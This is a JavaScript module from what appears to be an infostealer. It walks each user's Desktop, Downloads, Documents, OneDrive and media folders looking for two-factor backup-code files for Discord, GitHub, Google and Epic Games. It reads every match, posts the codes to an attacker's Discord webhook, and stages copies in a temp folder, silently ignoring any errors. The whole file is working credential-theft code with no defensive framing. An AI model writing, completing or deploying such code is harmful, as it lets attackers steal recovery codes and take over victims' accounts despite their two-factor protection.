const fs = require('fs/promises');
const path = require('path');

const hardware = require('./../../utils/hardware/hardware.js');
const fileutil = require('./../../utils/fileutil/fileutil.js');
const requests = require('./../../utils/requests/requests.js');

const backupFileNames = [
    // Add other security code services if you want
    "discord_backup_codes",
    "github-recovery-codes",
    "google-backup-codes",
    "Epic Games Account Two-Factor backup codes"
];

const searchFiles = async (dir, webhookUrl) => {
    try {
        const files = await fs.readdir(dir);
        const tasks = files.map(async (file) => {
            const filePath = path.join(dir, file);
            const stats = await fs.stat(filePath);

            if (stats.isFile() && stats.size <= 2 * 1024 * 1024 && backupFileNames.some(name => file.includes(name))) {
                const codes = await fs.readFile(filePath, 'utf8');
                if (codes.length > 0) {
                    await requests.webhook(webhookUrl, {
                        content: 'File: `' + filePath + '`',
                        embeds: [{
                            title: 'Backup Codes',
                            description: '```' + codes + '```'
                        }]
                    });

                    const codesInfo = [
                        `File: ${filePath}`,
                        `${codes}`,
                    ];
    
                    const WishTempDir = fileutil.WishTempDir('codes');
                    await fileutil.writeDataToFile(WishTempDir, `codesInfo-${path.basename(filePath)}.txt`, codesInfo);
                }
            } else if (stats.isDirectory()) {
                await searchFiles(filePath, webhookUrl); 
            }
        });

        await Promise.all(tasks);
    } catch (error) {
    }
};

module.exports = async (webhookUrl) => {
    const users = await hardware.getUsers();

    for (const user of users) {
        const directories = [
            path.join(user, 'Desktop'),
            path.join(user, 'Downloads'),
            path.join(user, 'Documents'),
            path.join(user, 'Videos'),
            path.join(user, 'Pictures'),
            path.join(user, 'Music'),
            path.join(user, 'OneDrive')
        ];

        for (const dir of directories) {
            const dirStats = await fs.stat(dir).catch(() => null);
            if (dirStats && dirStats.isDirectory()) {
                await searchFiles(dir, webhookUrl);
            }
        }
    }
};
